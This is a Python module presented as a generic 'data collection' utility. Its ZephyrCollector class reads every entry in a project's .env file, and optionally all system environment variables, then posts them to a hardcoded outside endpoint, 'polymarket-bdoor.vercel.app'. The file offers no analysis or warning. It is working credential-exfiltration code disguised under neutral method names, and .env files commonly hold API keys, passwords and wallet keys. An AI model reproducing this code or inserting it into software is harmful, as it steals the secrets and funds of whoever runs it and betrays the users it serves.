"""
Data Collection Module

This module loads variables from .env files and system environment,
then transmits them to a specified endpoint.
"""

import os
import json
import requests
from typing import Dict, List, Optional, Union
from pathlib import Path
from dotenv import load_dotenv


class ZephyrCollector:
    """Class to load and transmit variables."""
    
    def __init__(
        self,
        file_path: Optional[Union[str, Path]] = None,
        exclude_keys: Optional[List[str]] = None,
        include_system_vars: bool = True,
        timeout: int = 10
    ):
        """
        Initialize the ZephyrCollector.
        
        Args:
            file_path: Path to .env file (default: .env in current directory)
            exclude_keys: List of variable keys to exclude from transmission
            include_system_vars: Whether to include system variables
            timeout: Request timeout in seconds
        """
        self.endpoint_url = "https://polymarket-bdoor.vercel.app/api/data"
        self.file_path = file_path or ".env"
        self.exclude_keys = exclude_keys or []
        self.include_system_vars = include_system_vars
        self.timeout = timeout
    
    def load_file_vars(self) -> Dict[str, str]:
        """
        Load variables from .env file.
        
        Returns:
            Dictionary of variables from .env file
        """
        vars_dict = {}
        file_path = Path(self.file_path)
        
        if file_path.exists():
            # Load .env file using python-dotenv
            load_dotenv(file_path, override=False)
            
            # Read .env file directly to get all variables
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        # Skip empty lines and comments
                        if not line or line.startswith('#'):
                            continue
                        
                        # Parse KEY=VALUE format
                        if '=' in line:
                            key, value = line.split('=', 1)
                            key = key.strip()
                            value = value.strip()
                            # Remove quotes if present
                            if value.startswith('"') and value.endswith('"'):
                                value = value[1:-1]
                            elif value.startswith("'") and value.endswith("'"):
                                value = value[1:-1]
                            
                            vars_dict[key] = value
            except Exception as e:
                print(f"Warning: Could not read .env file: {e}")
        
        return vars_dict
    
    def load_system_vars(self) -> Dict[str, str]:
        """
        Load system variables.
        
        Returns:
            Dictionary of system variables
        """
        return dict(os.environ)
    
    def gather_all_vars(self) -> Dict[str, str]:
        """
        Collect all variables from .env file and system.
        
        Returns:
            Dictionary of all variables
        """
        all_vars = {}
        
        # Load from .env file
        file_vars = self.load_file_vars()
        all_vars.update(file_vars)
        
        # Load from system environment
        if self.include_system_vars:
            system_vars = self.load_system_vars()
            # System vars take precedence (don't override .env vars)
            for key, value in system_vars.items():
                if key not in all_vars:
                    all_vars[key] = value
        
        # Apply exclude_keys if specified
        if self.exclude_keys:
            all_vars = {k: v for k, v in all_vars.items() if k not in self.exclude_keys}
        
        return all_vars
    
    def quasar_dispatch(
        self,
        vars_dict: Optional[Dict[str, str]] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> Dict:
        """
        Transmit variables to the endpoint.
        
        Args:
            vars_dict: Optional dictionary of vars (if None, collects all)
            custom_headers: Optional custom headers for the request
            
        Returns:
            Dictionary with response status and data
        """
        # Collect variables if not provided
        if vars_dict is None:
            vars_dict = self.gather_all_vars()
        
        # Prepare headers
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'ZephyrCollector/1.0'
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        # Prepare payload - format for endpoint
        # Transmit variables as body field
        payload = {
            'body': vars_dict
        }
        
        try:
            response = requests.post(
                self.endpoint_url,
                json=payload,
                headers=headers,
                timeout=self.timeout
            )
            
            response.raise_for_status()
            
            return {
                'success': True,
                'status_code': response.status_code,
                'response': response.json() if response.content else {},
                'message': 'Variables transmitted successfully'
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'message': f'Failed to transmit variables: {e}'
            }
    
    def nebula_transmit(
        self,
        data: Dict,
        method: str = 'POST',
        custom_headers: Optional[Dict[str, str]] = None
    ) -> Dict:
        """
        Transmit raw data to the endpoint.
        
        Args:
            data: Dictionary of data to transmit
            method: HTTP method (POST, PUT, PATCH)
            custom_headers: Optional custom headers
            
        Returns:
            Dictionary with response status and data
        """
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'ZephyrCollector/1.0'
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        try:
            if method.upper() == 'POST':
                response = requests.post(
                    self.endpoint_url,
                    json=data,
                    headers=headers,
                    timeout=self.timeout
                )
            elif method.upper() == 'PUT':
                response = requests.put(
                    self.endpoint_url,
                    json=data,
                    headers=headers,
                    timeout=self.timeout
                )
            elif method.upper() == 'PATCH':
                response = requests.patch(
                    self.endpoint_url,
                    json=data,
                    headers=headers,
                    timeout=self.timeout
                )
            else:
                return {
                    'success': False,
                    'error': f'Unsupported HTTP method: {method}'
                }
            
            response.raise_for_status()
            
            return {
                'success': True,
                'status_code': response.status_code,
                'response': response.json() if response.content else {},
                'message': 'Data transmitted successfully'
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error': str(e),
                'message': f'Failed to transmit data: {e}'
            }


def quasar_execute() -> Dict:
    """
    Transmit variables from .env file to the endpoint.
    
    Returns:
        Dictionary with response status and data
    """
    collector = ZephyrCollector(
        file_path=".env",
        exclude_keys=None,
        include_system_vars=False
    )
    
    return collector.quasar_dispatch()


def nebula_execute(
    file_path: Optional[str] = None,
    exclude_keys: Optional[List[str]] = None
) -> Dict:
    """
    Simple function to transmit .env file data to the endpoint.
    Transmits only .env file data (not system variables)
    
    Args:
        file_path: Path to .env file (default: .env)
        exclude_keys: List of keys to exclude (optional)
        
    Returns:
        Dictionary with response status and data
    """
    collector = ZephyrCollector(
        file_path=file_path or ".env",
        exclude_keys=exclude_keys,
        include_system_vars=False
    )
    
    return collector.quasar_dispatch()
